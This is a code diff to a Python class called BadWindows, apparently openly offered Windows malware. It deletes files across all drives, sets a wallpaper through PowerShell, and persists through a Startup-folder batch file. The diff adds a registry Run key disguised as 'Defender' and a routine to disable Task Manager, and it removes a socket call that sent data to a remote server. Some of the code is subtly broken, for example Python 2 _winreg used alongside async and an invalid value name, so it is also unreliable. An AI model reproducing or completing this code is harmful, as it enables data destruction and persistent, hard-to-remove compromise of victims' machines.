@@ -6,6 +6,7 @@ from ctypes import windll
 import string
 import subprocess
 import getpass
+import _winreg
 class BadWindows(object):
     FILE_PATH = []
     def __init__(self) -> None:
@@ -22,7 +23,7 @@ class BadWindows(object):
         except:
             return False
         
-    async def delete_all_file(self) -> bool:        
+    async def delete_all_file(self) -> bool:
         try:
             for drive in await self.get_drive():
                     os.chdir(f'{drive}:')
@@ -109,7 +110,7 @@ Set-WallPaper("""+path_file+""")
             USER_NAME = getpass.getuser()
             bat_path = f'C:\\Users\\{USER_NAME}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup' 
             with open(bat_path + '\\' + "file.bat", "w+") as bat_file:
-                bat_file.write(f"@echo off\nstart {file_path}")
+                bat_file.write(f"@echo off\nstart {__file__}")
             return True
         except:
             return False
@@ -124,17 +125,25 @@ Set-WallPaper("""+path_file+""")
             file.write(command)
             file.close()
         subprocess.getoutput("powershell.exe -F script.ps1")
-        os.remove("script.ps1")
+        os.remove('script.ps1')
         return True
-
-    async def connect_to_server(self , server_address : str , port_address : str , data : bytes = None) -> socket.socket:
-        sock = socket.socket()
+    
+    async def add_registry_startup(self , path_file : str) -> bool:
         try:
-            sock.connect((server_address , port_address))
-            sock.send(data)
-            return sock
-        except Exception:
-            raise Exception("Connection is not possible")
-        
+            key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER , 'Software\\Microsoft\\Windows\\CurrentVersion\\Run',_winreg.KEY_SET_VALUE)
+            _winreg.SetValueEx(key, "Defender", 0, _winreg.REG_BINARY, path_file)
+            return True
+        except PermissionError:
+            raise PermissionError("Please Run With User Admin")
         except:
-            return False
+            raise Exception("Error..!")
+        
+    async def disable_task_manager(self) -> bool:
+        try:
+            reg_key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\Windows\\CurrentVersion\\Policies\System", 0, _winreg.KEY_SET_VALUE)
+            _winreg.SetValueEx(reg_key, "None", 0, _winreg.REG_SZ, 1)
+            _winreg.CloseKey(reg_key)
+            return True
+        except WindowsError:
+            raise WindowsError("There was an error setting the registry key")    
+        
